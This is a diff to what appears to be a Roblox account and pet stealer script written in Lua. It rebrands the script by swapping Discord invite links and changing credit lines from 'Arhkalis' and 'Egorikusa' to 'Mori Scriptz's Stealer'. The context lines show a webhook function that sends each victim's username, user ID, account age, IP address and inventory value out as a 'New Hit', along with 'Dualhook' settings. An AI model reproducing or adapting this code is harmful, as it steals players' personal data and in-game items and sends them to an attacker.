@@ -1028,7 +1028,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
             ["avatar_url"] = imgs,
             ["embeds"] = { {
                 ["title"] = "**New Hit** ||With Mori||",
-                ["url"] = "https://discord.gg/ZasWC8sWBw",
+                ["url"] = "https://discord.gg/tcURDKgM69",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
@@ -1037,7 +1037,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Arhkalis Scriptz's Stealer** :moyai:",
+                    ["name"] = "**This data was generated using Mori Scriptz's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1098,7 +1098,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
             ["avatar_url"] = imgs,
             ["embeds"] = { {
                 ["title"] = "**New Hit** ||With Mori||",
-                ["url"] = "https://discord.gg/ZasWC8sWBw",
+                ["url"] = "https://discord.gg/tcURDKgM69",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
@@ -1107,7 +1107,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Egorikusa Scriptz's Stealer** :moyai:",
+                    ["name"] = "**This data was generated using Mori Scriptz's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1184,7 +1184,7 @@ local eventin
 local secretin
 local mythicin
 local gemsin
-local mailmsg = "Mori Easy"
+local mailmsg = "Memento Mori !"
 if dhuser ~= nil then
     if getgenv().Settings.Titanics.Dualhook then
         titanicin = getgenv().Settings.Titanics.Intensity
